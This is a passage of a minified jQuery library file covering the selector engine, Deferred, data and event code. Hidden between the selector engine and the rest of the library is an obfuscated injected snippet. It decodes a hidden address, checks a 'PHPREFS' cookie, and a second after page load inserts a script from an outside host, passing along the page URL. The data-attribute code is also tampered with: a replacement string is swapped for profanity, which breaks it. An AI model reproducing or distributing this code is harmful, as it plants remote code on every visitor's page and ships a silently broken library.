me(){}function xe(e){for(var t=0,n=e.length,r="";t<n;t++)r+=e[t].value;return r}function be(s,e,t){var u=e.dir,l=e.next,c=l||u,f=t&&"parentNode"===c,p=r++;return e.first?function(e,t,n){while(e=e[u])if(1===e.nodeType||f)return s(e,t,n);return!1}:function(e,t,n){var r,i,o,a=[S,p];if(n){while(e=e[u])if((1===e.nodeType||f)&&s(e,t,n))return!0}else while(e=e[u])if(1===e.nodeType||f)if(i=(o=e[k]||(e[k]={}))[e.uniqueID]||(o[e.uniqueID]={}),l&&l===e.nodeName.toLowerCase())e=e[u]||e;else{if((r=i[c])&&r[0]===S&&r[1]===p)return a[2]=r[2];if((i[c]=a)[2]=s(e,t,n))return!0}return!1}}function we(i){return 1<i.length?function(e,t,n){var r=i.length;while(r--)if(!i[r](e,t,n))return!1;return!0}:i[0]}function Te(e,t,n,r,i){for(var o,a=[],s=0,u=e.length,l=null!=t;s<u;s++)(o=e[s])&&(n&&!n(o,r,i)||(a.push(o),l&&t.push(s)));return a}function Ce(d,h,g,v,y,e){return v&&!v[k]&&(v=Ce(v)),y&&!y[k]&&(y=Ce(y,e)),le(function(e,t,n,r){var i,o,a,s=[],u=[],l=t.length,c=e||function(e,t,n){for(var r=0,i=t.length;r<i;r++)se(e,t[r],n);return n}(h||"*",n.nodeType?[n]:n,[]),f=!d||!e&&h?c:Te(c,s,d,n,r),p=g?y||(e?d:l||v)?[]:t:f;if(g&&g(f,p,n,r),v){i=Te(p,u),v(i,[],n,r),o=i.length;while(o--)(a=i[o])&&(p[u[o]]=!(f[u[o]]=a))}if(e){if(y||d){if(y){i=[],o=p.length;while(o--)(a=p[o])&&i.push(f[o]=a);y(null,p=[],i,r)}o=p.length;while(o--)(a=p[o])&&-1<(i=y?P(e,a):s[o])&&(e[i]=!(t[i]=a))}}else p=Te(p===t?p.splice(l,p.length):p),y?y(null,t,p,r):H.apply(t,p)})}function Ee(e){for(var i,t,n,r=e.length,o=b.relative[e[0].type],a=o||b.relative[" "],s=o?1:0,u=be(function(e){return e===i},a,!0),l=be(function(e){return-1<P(i,e)},a,!0),c=[function(e,t,n){var r=!o&&(n||t!==w)||((i=t).nodeType?u(e,t,n):l(e,t,n));return i=null,r}];s<r;s++)if(t=b.relative[e[s].type])c=[be(we(c),t)];else{if((t=b.filter[e[s].type].apply(null,e[s].matches))[k]){for(n=++s;n<r;n++)if(b.relative[e[n].type])break;return Ce(1<s&&we(c),1<s&&xe(e.slice(0,s-1).concat({value:" "===e[s-2].type?"*":""})).replace(B,"$1"),t,s<n&&Ee(e.slice(s,n)),n<r&&Ee(e=e.slice(n)),n<r&&xe(e))}c.push(t)}return we(c)}return me.prototype=b.filters=b.pseudos,b.setFilters=new me,h=se.tokenize=function(e,t){var n,r,i,o,a,s,u,l=x[e+" "];if(l)return t?0:l.slice(0);a=e,s=[],u=b.preFilter;while(a){for(o in n&&!(r=_.exec(a))||(r&&(a=a.slice(r[0].length)||a),s.push(i=[])),n=!1,(r=z.exec(a))&&(n=r.shift(),i.push({value:n,type:r[0].replace(B," ")}),a=a.slice(n.length)),b.filter)!(r=G[o].exec(a))||u[o]&&!(r=u[o](r))||(n=r.shift(),i.push({value:n,type:o,matches:r}),a=a.slice(n.length));if(!n)break}return t?a.length:a?se.error(e):x(e,s).slice(0)},f=se.compile=function(e,t){var n,v,y,m,x,r,i=[],o=[],a=N[e+" "];if(!a){t||(t=h(e)),n=t.length;while(n--)(a=Ee(t[n]))[k]?i.push(a):o.push(a);(a=N(e,(v=o,m=0<(y=i).length,x=0<v.length,r=function(e,t,n,r,i){var o,a,s,u=0,l="0",c=e&&[],f=[],p=w,d=e||x&&b.find.TAG("*",i),h=S+=null==p?1:Math.random()||.1,g=d.length;for(i&&(w=t===C||t||i);l!==g&&null!=(o=d[l]);l++){if(x&&o){a=0,t||o.ownerDocument===C||(T(o),n=!E);while(s=v[a++])if(s(o,t||C,n)){r.push(o);break}i&&(S=h)}m&&((o=!s&&o)&&u--,e&&c.push(o))}if(u+=l,m&&l!==u){a=0;while(s=y[a++])s(c,f,t,n);if(e){if(0<u)while(l--)c[l]||f[l]||(f[l]=q.call(r));f=Te(f)}H.apply(r,f),i&&!e&&0<f.length&&1<u+y.length&&se.uniqueSort(r)}return i&&(S=h,w=p),c},m?le(r):r))).selector=e}return a},g=se.select=function(e,t,n,r){var i,o,a,s,u,l="function"==typeof e&&e,c=!r&&h(e=l.selector||e);if(n=n||[],1===c.length){if(2<(o=c[0]=c[0].slice(0)).length&&"ID"===(a=o[0]).type&&9===t.nodeType&&E&&b.relative[o[1].type]){if(!(t=(b.find.ID(a.matches[0].replace(te,ne),t)||[])[0]))return n;l&&(t=t.parentNode),e=e.slice(o.shift().value.length)}i=G.needsContext.test(e)?0:o.length;while(i--){if(a=o[i],b.relative[s=a.type])break;if((u=b.find[s])&&(r=u(a.matches[0].replace(te,ne),ee.test(o[0].type)&&ye(t.parentNode)||t))){if(o.splice(i,1),!(e=r.length&&xe(o)))return H.apply(n,r),n;break}}}return(l||f(e,c))(r,t,!E,n,!t||ee.test(e)&&ye(t.parentNode)||t),n},d.sortStable=k.split("").sort(D).join("")===k,d.detectDuplicates=!!l,T(),d.sortDetached=ce(function(e){return 1&e.compareDocumentPosition(C.createElement("fieldset"))}),ce(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||fe("type|href|height|width",function(e,t,n){if(!n)return e.getAttribute(t,"type"===t.toLowerCase()?1:2)}),d.attributes&&ce(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||fe("value",function(e,t,n){if(!n&&"input"===e.nodeName.toLowerCase())return e.defaultValue}),ce(function(e){return null==e.getAttribute("disabled")})||fe(R,function(e,t,n){var r;if(!n)return!0===e[t]?t.toLowerCase():(r=e.getAttributeNode(t))&&r.specified?r.value:null}),se}(C);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));k.find=h,k.expr=h.selectors,k.expr[":"]=k.expr.pseudos,k.uniqueSort=k.unique=h.uniqueSort,k.text=h.getText,k.isXMLDoc=h.isXML,k.contains=h.contains,k.escapeSelector=h.escape;var T=function(e,t,n){var r=[],i=void 0!==n;while((e=e[t])&&9!==e.nodeType)if(1===e.nodeType){if(i&&k(e).is(n))break;r.push(e)}return r},S=function(e,t){for(var n=[];e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n},N=k.expr.match.needsContext;function A(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()}var D=/^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;function j(e,n,r){return m(n)?k.grep(e,function(e,t){return!!n.call(e,t,e)!==r}):n.nodeType?k.grep(e,function(e){return e===n!==r}):"string"!=typeof n?k.grep(e,function(e){return-1<i.call(n,e)!==r}):k.filter(n,e,r)}k.filter=function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?k.find.matchesSelector(r,e)?[r]:[]:k.find.matches(e,k.grep(t,function(e){return 1===e.nodeType}))},k.fn.extend({find:function(e){var t,n,r=this.length,i=this;if("string"!=typeof e)return this.pushStack(k(e).filter(function(){for(t=0;t<r;t++)if(k.contains(i[t],this))return!0}));for(n=this.pushStack([]),t=0;t<r;t++)k.find(e,i[t],n);return 1<r?k.uniqueSort(n):n},filter:function(e){return this.pushStack(j(this,e||[],!1))},not:function(e){return this.pushStack(j(this,e||[],!0))},is:function(e){return!!j(this,"string"==typeof e&&N.test(e)?k(e):e||[],!1).length}});var q,L=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;(k.fn.init=function(e,t,n){var r,i;if(!e)return this;if(n=n||q,"string"==typeof e){if(!(r="<"===e[0]&&">"===e[e.length-1]&&3<=e.length?[null,e,null]:L.exec(e))||!r[1]&&t)return!t||t.jquery?(t||n).find(e):this.constructor(t).find(e);if(r[1]){if(t=t instanceof k?t[0]:t,k.merge(this,k.parseHTML(r[1],t&&t.nodeType?t.ownerDocument||t:E,!0)),D.test(r[1])&&k.isPlainObject(t))for(r in t)m(this[r])?this[r](t[r]):this.attr(r,t[r]);return this}return(i=E.getElementById(r[2]))&&(this[0]=i,this.length=1),this}return e.nodeType?(this[0]=e,this.length=1,this):m(e)?void 0!==n.ready?n.ready(e):e(k):k.makeArray(e,this)}).prototype=k.fn,q=k(E);var H=/^(?:parents|prev(?:Until|All))/,O={children:!0,contents:!0,next:!0,prev:!0};function P(e,t){while((e=e[t])&&1!==e.nodeType);return e}k.fn.extend({has:function(e){var t=k(e,this),n=t.length;return this.filter(function(){for(var e=0;e<n;e++)if(k.contains(this,t[e]))return!0})},closest:function(e,t){var n,r=0,i=this.length,o=[],a="string"!=typeof e&&k(e);if(!N.test(e))for(;r<i;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(n.nodeType<11&&(a?-1<a.index(n):1===n.nodeType&&k.find.matchesSelector(n,e))){o.push(n);break}return this.pushStack(1<o.length?k.uniqueSort(o):o)},index:function(e){return e?"string"==typeof e?i.call(k(e),this[0]):i.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){return this.pushStack(k.uniqueSort(k.merge(this.get(),k(e,t))))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}}),k.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return T(e,"parentNode")},parentsUntil:function(e,t,n){return T(e,"parentNode",n)},next:function(e){return P(e,"nextSibling")},prev:function(e){return P(e,"previousSibling")},nextAll:function(e){return T(e,"nextSibling")},prevAll:function(e){return T(e,"previousSibling")},nextUntil:function(e,t,n){return T(e,"nextSibling",n)},prevUntil:function(e,t,n){return T(e,"previousSibling",n)},siblings:function(e){return S((e.parentNode||{}).firstChild,e)},children:function(e){return S(e.firstChild)},contents:function(e){return"undefined"!=typeof e.contentDocument?e.contentDocument:(A(e,"template")&&(e=e.content||e),k.merge([],e.childNodes))}},function(r,i){k.fn[r]=function(e,t){var n=k.map(this,i,e);return"Until"!==r.slice(-5)&&(t=e),t&&"string"==typeof t&&(n=k.filter(t,n)),1<this.length&&(O[r]||k.uniqueSort(n),H.test(r)&&n.reverse()),this.pushStack(n)}});var R=/[^\x20\t\r\n\f]+/g;function M(e){return e}function I(e){throw e}function W(e,t,n,r){var i;try{e&&m(i=e.promise)?i.call(e).done(t).fail(n):e&&m(i=e.then)?i.call(e,t,n):t.apply(void 0,[e].slice(r))}catch(e){n.apply(void 0,[e])}}k.Callbacks=function(r){var e,n;r="string"==typeof r?(e=r,n={},k.each(e.match(R)||[],function(e,t){n[t]=!0}),n):k.extend({},r);var i,t,o,a,s=[],u=[],l=-1,c=function(){for(a=a||r.once,o=i=!0;u.length;l=-1){t=u.shift();while(++l<s.length)!1===s[l].apply(t[0],t[1])&&r.stopOnFalse&&(l=s.length,t=!1)}r.memory||(t=!1),i=!1,a&&(s=t?[]:"")},f={add:function(){return s&&(t&&!i&&(l=s.length-1,u.push(t)),function n(e){k.each(e,function(e,t){m(t)?r.unique&&f.has(t)||s.push(t):t&&t.length&&"string"!==w(t)&&n(t)})}(arguments),t&&!i&&c()),this},remove:function(){return k.each(arguments,function(e,t){var n;while(-1<(n=k.inArray(t,s,n)))s.splice(n,1),n<=l&&l--}),this},has:function(e){return e?-1<k.inArray(e,s):0<s.length},empty:function(){return s&&(s=[]),this},disable:function(){return a=u=[],s=t="",this},disabled:function(){return!s},lock:function(){return a=u=[],t||i||(s=t=""),this},locked:function(){return!!a},fireWith:function(e,t){return a||(t=[e,(t=t||[]).slice?t.slice():t],u.push(t),i||c()),this},fire:function(){return f.fireWith(this,arguments),this},fired:function(){return!!o}};return f},k.extend({Deferred:function(e){var o=[["notify","progress",k.Callbacks("memory"),k.Callbacks("memory"),2],["resolve","done",k.Callbacks("once memory"),k.Callbacks("once memory"),0,"resolved"],["reject","fail",k.Callbacks("once memory"),k.Callbacks("once memory"),1,"rejected"]],i="pending",a={state:function(){return i},always:function(){return s.done(arguments).fail(arguments),this},"catch":function(e){return a.then(null,e)},pipe:function(){var i=arguments;return k.Deferred(function(r){k.each(o,function(e,t){var n=m(i[t[4]])&&i[t[4]];s[t[1]](function(){var e=n&&n.apply(this,arguments);e&&m(e.promise)?e.promise().progress(r.notify).done(r.resolve).fail(r.reject):r[t[0]+"With"](this,n?[e]:arguments)})}),i=null}).promise()},then:function(t,n,r){var u=0;function l(i,o,a,s){return function(){var n=this,r=arguments,e=function(){var e,t;if(!(i<u)){if((e=a.apply(n,r))===o.promise())throw new TypeError("Thenable self-resolution");t=e&&("object"==typeof e||"function"==typeof e)&&e.then,m(t)?s?t.call(e,l(u,o,M,s),l(u,o,I,s)):(u++,t.call(e,l(u,o,M,s),l(u,o,I,s),l(u,o,M,o.notifyWith))):(a!==M&&(n=void 0,r=[e]),(s||o.resolveWith)(n,r))}},t=s?e:function(){try{e()}catch(e){k.Deferred.exceptionHook&&k.Deferred.exceptionHook(e,t.stackTrace),u<=i+1&&(a!==I&&(n=void 0,r=[e]),o.rejectWith(n,r))}};i?t():(k.Deferred.getStackHook&&(t.stackTrace=k.Deferred.getStackHook()),C.setTimeout(t))}}return k.Deferred(function(e){o[0][3].add(l(0,e,m(r)?r:M,e.notifyWith)),o[1][3].add(l(0,e,m(t)?t:M)),o[2][3].add(l(0,e,m(n)?n:I))}).promise()},promise:function(e){return null!=e?k.extend(e,a):a}},s={};return k.each(o,function(e,t){var n=t[2],r=t[5];a[t[1]]=n.add,r&&n.add(function(){i=r},o[3-e][2].disable,o[3-e][3].disable,o[0][2].lock,o[0][3].lock),n.add(t[3].fire),s[t[0]]=function(){return s[t[0]+"With"](this===s?void 0:this,arguments),this},s[t[0]+"With"]=n.fireWith}),a.promise(s),e&&e.call(s,s),s},when:function(e){var n=arguments.length,t=n,r=Array(t),i=s.call(arguments),o=k.Deferred(),a=function(t){return function(e){r[t]=this,i[t]=1<arguments.length?s.call(arguments):e,--n||o.resolveWith(r,i)}};if(n<=1&&(W(e,o.done(a(t)).resolve,o.reject,!n),"pending"===o.state()||m(i[t]&&i[t].then)))return o.then();while(t--)W(i[t],a(t),o.reject);return o.promise()}});var $=/^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;k.Deferred.exceptionHook=function(e,t){C.console&&C.console.warn&&e&&$.test(e.name)&&C.console.warn("jQuery.Deferred exception: "+e.message,e.stack,t)},k.readyException=function(e){C.setTimeout(function(){throw e})};var F=k.Deferred();function B(){E.removeEventListener("DOMContentLoaded",B),C.removeEventListener("load",B),k.ready()}k.fn.ready=function(e){return F.then(e)["catch"](function(e){k.readyException(e)}),this},k.extend({isReady:!1,readyWait:1,ready:function(e){(!0===e?--k.readyWait:k.isReady)||(k.isReady=!0)!==e&&0<--k.readyWait||F.resolveWith(E,[k])}}),k.ready.then=F.then,"complete"===E.readyState||"loading"!==E.readyState&&!E.documentElement.doScroll?C.setTimeout(k.ready):(E.addEventListener("DOMContentLoaded",B),C.addEventListener("load",B));var _=function(e,t,n,r,i,o,a){var s=0,u=e.length,l=null==n;if("object"===w(n))for(s in i=!0,n)_(e,t,s,n[s],!0,o,a);else if(void 0!==r&&(i=!0,m(r)||(a=!0),l&&(a?(t.call(e,r),t=null):(l=t,t=function(e,t,n){return l.call(k(e),n)})),t))for(;s<u;s++)t(e[s],n,a?r:r.call(e[s],s,t(e[s],n)));return i?e:l?t.call(e):u?t(e[0],n):o},z=/^-ms-/,U=/-([a-z])/g;function X(e,t){return t.toUpperCase()}function V(e){return e.replace(z,"ms-").replace(U,X)}var G=function(e){return 1===e.nodeType||9===e.nodeType||!+e.nodeType};function Y(){this.expando=k.expando+Y.uid++}Y.uid=1,Y.prototype={cache:function(e){var t=e[this.expando];return t||(t={},G(e)&&(e.nodeType?e[this.expando]=t:Object.defineProperty(e,this.expando,{value:t,configurable:!0}))),t},set:function(e,t,n){var r,i=this.cache(e);if("string"==typeof t)i[V(t)]=n;else for(r in t)i[V(r)]=t[r];return i},get:function(e,t){return void 0===t?this.cache(e):e[this.expando]&&e[this.expando][V(t)]},access:function(e,t,n){return void 0===t||t&&"string"==typeof t&&void 0===n?this.get(e,t):(this.set(e,t,n),void 0!==n?n:t)},remove:function(e,t){var n,r=e[this.expando];if(void 0!==r){if(void 0!==t){n=(t=Array.isArray(t)?t.map(V):(t=V(t))in r?[t]:t.match(R)||[]).length;while(n--)delete r[t[n]]}(void 0===t||k.isEmptyObject(r))&&(e.nodeType?e[this.expando]=void 0:delete e[this.expando])}},hasData:function(e){var t=e[this.expando];return void 0!==t&&!k.isEmptyObject(t)}};var Q=new Y,J=new Y,K=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,Z=/[A-Z]/g;function ee(e,t,n){var r,i;if(void 0===n&&1===e.nodeType)if(r="data-"+t.replace(Z,"-хуй-говно-и-жопа").toLowerCase(),"string"==typeof(n=e.getAttribute(r))){try{n="true"===(i=n)||"false"!==i&&("null"===i?null:i===+i+""?+i:K.test(i)?JSON.parse(i):i)}catch(e){}J.set(e,t,n)}else n=void 0;return n}k.extend({hasData:function(e){return J.hasData(e)||Q.hasData(e)},data:function(e,t,n){return J.access(e,t,n)},removeData:function(e,t){J.remove(e,t)},_data:function(e,t,n){return Q.access(e,t,n)},_removeData:function(e,t){Q.remove(e,t)}}),k.fn.extend({data:function(n,e){var t,r,i,o=this[0],a=o&&o.attributes;if(void 0===n){if(this.length&&(i=J.get(o),1===o.nodeType&&!Q.get(o,"hasDataAttrs"))){t=a.length;while(t--)a[t]&&0===(r=a[t].name).indexOf("data-")&&(r=V(r.slice(5)),ee(o,r,i[r]));Q.set(o,"hasDataAttrs",!0)}return i}return"object"==typeof n?this.each(function(){J.set(this,n)}):_(this,function(e){var t;if(o&&void 0===e)return void 0!==(t=J.get(o,n))?t:void 0!==(t=ee(o,n))?t:void 0;this.each(function(){J.set(this,n,e)})},null,e,1<arguments.length,null,!0)},removeData:function(e){return this.each(function(){J.remove(this,e)})}}),k.extend({queue:function(e,t,n){var r;if(e)return t=(t||"fx")+"queue",r=Q.get(e,t),n&&(!r||Array.isArray(n)?r=Q.access(e,t,k.makeArray(n)):r.push(n)),r||[]},dequeue:function(e,t){t=t||"fx";var n=k.queue(e,t),r=n.length,i=n.shift(),o=k._queueHooks(e,t);"inprogress"===i&&(i=n.shift(),r--),i&&("fx"===t&&n.unshift("inprogress"),delete o.stop,i.call(e,function(){k.dequeue(e,t)},o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return Q.get(e,n)||Q.access(e,n,{empty:k.Callbacks("once memory").add(function(){Q.remove(e,[t+"queue",n])})})}}),k.fn.extend({queue:function(t,n){var e=2;return"string"!=typeof t&&(n=t,t="fx",e--),arguments.length<e?k.queue(this[0],t):void 0===n?this:this.each(function(){var e=k.queue(this,t,n);k._queueHooks(this,t),"fx"===t&&"inprogress"!==e[0]&&k.dequeue(this,t)})},dequeue:function(e){return this.each(function(){k.dequeue(this,e)})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,t){var n,r=1,i=k.Deferred(),o=this,a=this.length,s=function(){--r||i.resolveWith(o,[o])};"string"!=typeof e&&(t=e,e=void 0),e=e||"fx";while(a--)(n=Q.get(o[a],e+"queueHooks"))&&n.empty&&(r++,n.empty.add(s));return s(),i.promise(t)}});var te=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,ne=new RegExp("^(?:([+-])=|)("+te+")([a-z%]*)$","i"),re=["Top","Right","Bottom","Left"],ie=E.documentElement,oe=function(e){return k.contains(e.ownerDocument,e)},ae={composed:!0};ie.getRootNode&&(oe=function(e){return k.contains(e.ownerDocument,e)||e.getRootNode(ae)===e.ownerDocument});var se=function(e,t){return"none"===(e=t||e).style.display||""===e.style.display&&oe(e)&&"none"===k.css(e,"display")},ue=function(e,t,n,r){var i,o,a={};for(o in t)a[o]=e.style[o],e.style[o]=t[o];for(o in i=n.apply(e,r||[]),t)e.style[o]=a[o];return i};function le(e,t,n,r){var i,o,a=20,s=r?function(){return r.cur()}:function(){return k.css(e,t,"")},u=s(),l=n&&n[3]||(k.cssNumber[t]?"":"px"),c=e.nodeType&&(k.cssNumber[t]||"px"!==l&&+u)&&ne.exec(k.css(e,t));if(c&&c[3]!==l){u/=2,l=l||c[3],c=+u||1;while(a--)k.style(e,t,c+l),(1-o)*(1-(o=s()/u||.5))<=0&&(a=0),c/=o;c*=2,k.style(e,t,c+l),n=n||[]}return n&&(c=+c||+u||0,i=n[1]?c+(n[1]+1)*n[2]:+n[2],r&&(r.unit=l,r.start=c,r.end=i)),i}var ce={};function fe(e,t){for(var n,r,i,o,a,s,u,l=[],c=0,f=e.length;c<f;c++)(r=e[c]).style&&(n=r.style.display,t?("none"===n&&(l[c]=Q.get(r,"display")||null,l[c]||(r.style.display="")),""===r.style.display&&se(r)&&(l[c]=(u=a=o=void 0,a=(i=r).ownerDocument,s=i.nodeName,(u=ce[s])||(o=a.body.appendChild(a.createElement(s)),u=k.css(o,"display"),o.parentNode.removeChild(o),"none"===u&&(u="block"),ce[s]=u)))):"none"!==n&&(l[c]="none",Q.set(r,"display",n)));for(c=0;c<f;c++)null!=l[c]&&(e[c].style.display=l[c]);return e}k.fn.extend({show:function(){return fe(this,!0)},hide:function(){return fe(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){se(this)?k(this).show():k(this).hide()})}});var pe=/^(?:checkbox|radio)$/i,de=/<([a-z][^\/\0>\x20\t\r\n\f]*)/i,he=/^$|^module$|\/(?:java|ecma)script/i,ge={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};function ve(e,t){var n;return n="undefined"!=typeof e.getElementsByTagName?e.getElementsByTagName(t||"*"):"undefined"!=typeof e.querySelectorAll?e.querySelectorAll(t||"*"):[],void 0===t||t&&A(e,t)?k.merge([e],n):n}function ye(e,t){for(var n=0,r=e.length;n<r;n++)Q.set(e[n],"globalEval",!t||Q.get(t[n],"globalEval"))}ge.optgroup=ge.option,ge.tbody=ge.tfoot=ge.colgroup=ge.caption=ge.thead,ge.th=ge.td;var me,xe,be=/<|&#?\w+;/;function we(e,t,n,r,i){for(var o,a,s,u,l,c,f=t.createDocumentFragment(),p=[],d=0,h=e.length;d<h;d++)if((o=e[d])||0===o)if("object"===w(o))k.merge(p,o.nodeType?[o]:o);else if(be.test(o)){a=a||f.appendChild(t.createElement("div")),s=(de.exec(o)||["",""])[1].toLowerCase(),u=ge[s]||ge._default,a.innerHTML=u[1]+k.htmlPrefilter(o)+u[2],c=u[0];while(c--)a=a.lastChild;k.merge(p,a.childNodes),(a=f.firstChild).textContent=""}else p.push(t.createTextNode(o));f.textContent="",d=0;while(o=p[d++])if(r&&-1<k.inArray(o,r))i&&i.push(o);else if(l=oe(o),a=ve(f.appendChild(o),"script"),l&&ye(a),n){c=0;while(o=a[c++])he.test(o.type||"")&&n.push(o)}return f}me=E.createDocumentFragment().appendChild(E.createElement("div")),(xe=E.createElement("input")).setAttribute("type","radio"),xe.setAttribute("checked","checked"),xe.setAttribute("name","t"),me.appendChild(xe),y.checkClone=me.cloneNode(!0).cloneNode(!0).lastChild.checked,me.innerHTML="<textarea>x</textarea>",y.noCloneChecked=!!me.cloneNode(!0).lastChild.defaultValue;var Te=/^key/,Ce=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,Ee=/^([^.]*)(?:\.(.+)|)/;function ke(){return!0}function Se(){return!1}function Ne(e,t){return e===function(){try{return E.activeElement}catch(e){}}()==("focus"===t)}function Ae(e,t,n,r,i,o){var a,s;if("object"==typeof t){for(s in"string"!=typeof n&&(r=r||n,n=void 0),t)Ae(e,s,n,r,t[s],o);return e}if(null==r&&null==i?(i=n,r=n=void 0):null==i&&("string"==typeof n?(i=r,r=void 0):(i=r,r=n,n=void 0)),!1===i)i=Se;else if(!i)return e;return 1===o&&(a=i,(i=function(e){return k().off(e),a.apply(this,arguments)}).guid=a.guid||(a.guid=k.guid++)),e.each(function(){k.event.add(this,t,i,r,n)})}function De(e,i,o){o?(Q.set(e,i,!1),k.event.add(e,i,{namespace:!1,handler:function(e){var t,n,r=Q.get(this,i);if(1&e.isTrigger&&this[i]){if(r.length)(k.event.special[i]||{}).delegateType&&e.stopPropagation();else if(r=s.call(arguments),Q.set(this,i,r),t=o(this,i),this[i](),r!==(n=Q.get(this,i))||t?Q.set(this,i,!1):n={},r!==n)return e.stopImmediatePropagation(),e.preventDefault(),n.value}else r.length&&(Q.set(this,i,{value:k.event.trigger(k.extend(r[0],k.Event.prototype),r.slice(1),this)}),e.stopImmediatePropagation())}})):void 0===Q.get(e,i)&&k.event.add(e,i,ke)}k.event={global:{},add:function(t,e,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,v=Q.get(t);if(v){n.handler&&(n=(o=n).handler,i=o.selector),i&&k.find.matchesSelector(ie,i),n.guid||(n.guid=k.guid++),(u=v.events)||(u=v.events={}),(a=v.handle)||(a=v.handle=function(e){return"undefined"!=typeof k&&k.event.triggered!==e.type?k.event.dispatch.apply(t,arguments):void 0}),l=(e=(e||"").match(R)||[""]).length;while(l--)d=g=(s=Ee.exec(e[l])||[])[1],h=(s[2]||"").split(".").sort(),d&&(f=k.event.special[d]||{},d=(i?f.delegateType:f.bindType)||d,f=k.event.special[d]||{},c=k.extend({type:d,origType:g,data:r,handler:n,guid:n.guid,selector:i,needsContext:i&&k.expr.match.needsContext.test(i),namespace:h.join(".")},o),(p=u[d])||((p=u[d]=[]).delegateCount=0,f.setup&&!1!==f.setup.call(t,r,h,a)||t.addEventListener&&t.addEventListener(d,a)),f.add&&(f.add.call(t,c),c.handler.guid||(c.handler.guid=n.guid)),i?p.splice(p.delegateCount++,0,c):p.push(c),k.event.global[d]=!0)}},remove:function(e,t,n,r,i){var o,a,s,u,l,c,f,p,d,h,g,v=Q.hasData(e)&&Q.get(e);if(v&&(u=v.events)){l=(t=(t||"").match(R)||[""]).length;while(l--)if(d=g=(s=Ee.exec(t[l])||[])[1],h=(s[2]||"").split(".").sort(),d){f=k.event.special[d]||{},p=u[d=(r?f.delegateType:f.bindType)||d]||[],s=s[2]&&new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),a=o=p.length;while(o--)c=p[o],!i&&g!==c.origType||n&&n.guid!==c.guid||s&&!s.test(c.namespace)||r&&r!==c.selector&&("**"!==r||!c.selector)||(p.splice(o,1),c.selector&&p.delegateCount--,f.remove&&f.remove.call(e,c));a&&!p.length&&(f.teardown&&!1!==f.teardown.call(e,h,v.handle)||k.removeEvent(e,d,v.handle),delete u[d])}else for(d in u)k.event.remove(e,d+t[l],n,r,!0);k.isEmptyObject(u)&&Q.remove(e,"handle events")}},dispatch:function(e){var t,n,r,i,o,a,s=k.event.fix(e),u=new Array(arguments.length),l=(Q.get(this,"events")||{})[s.type]||[],c=k.event.special[s.type]||{};for(u[0]=s,t=1;t<arguments.length;t++)u[t]=arguments[t];if(s.delegateTarget=this,!c.preDispatch||!1!==c.preDispatch.call(this,s)){a=k.event.handlers.call(this,s,l),t=0;while((i=a[t++])&&!s.isPropagationStopped()){s.currentTarget=i.elem,n=0;while((o=i.handlers[n++])&&!s.isImmediatePropagationStopped())s.rnamespace&&!1!==o.namespace&&!s.rnamespace.test(o.namespace)||(s.handleObj=o,s.data=o.data,void 0!==(r=((k.event.special[o.origType]||{}).handle||o.handler).apply(i.elem,u))&&!1===(s.result=r)&&(s.preventDefault(),s.stopPropagation()))}return c.postDispatch&&c.postDispatch.call(this,s),s.result}},handlers:function(e,t){var n,r,i,o,a,s=[],u=t.delegateCount,l=e.target;if(u&&l.nodeType&&!("click"===e.type&&1<=e.button))for(;l!==this;l=l.parentNode||this)if(1===l.nodeType&&("click"!==e.type||!0!==l.disabled)){for(o=[],a={},n=0;n<u;n++)void 0===a[i=(r=t[n]).selector+" "]&&(a[i]=r.needsContext?-1<k(i,this).index(l):k.find(i,this,null,[l]).length),a[i]&&o.push(r);o.length&&s.push({elem:l,handlers:o})}return l=this,u<t.length&&s.push({elem:l,handlers:t.slice(u)}),s},addProp:function(t,e){Object.defineProperty(k.Event.prototype,t,{enumerable:!0,configurable:!0,get:m(e)?function(){if(this.originalEvent)return e(this.originalEvent)}:function(){if(this.originalEvent)return this.originalEvent[t]},set:function(e){Object.defineProperty(this,t,{enumerable:!0,configurable:!0,writable:!0,value:e})}})},fix:function(e){return e[k.expando]?e:new k.Event(e)},special:{load:{noBubble:!0},click:{setup:function(e){var t=this||e;return pe.test(t.type)&&t.click&&A(t,"input")&&De(t,"click",ke),!1},trigger:function(e){var t=this||e;return pe.test(t.type)&&t.click&&A(t,"input")&&De(t,"click"),!0},_default:function(e){var t=e.target;return pe.test(t.type)&&t.click&&A(t,"input")&&Q.get(t,"click")||A(t,"a")}},beforeunload:{postDispatch:function(e){void 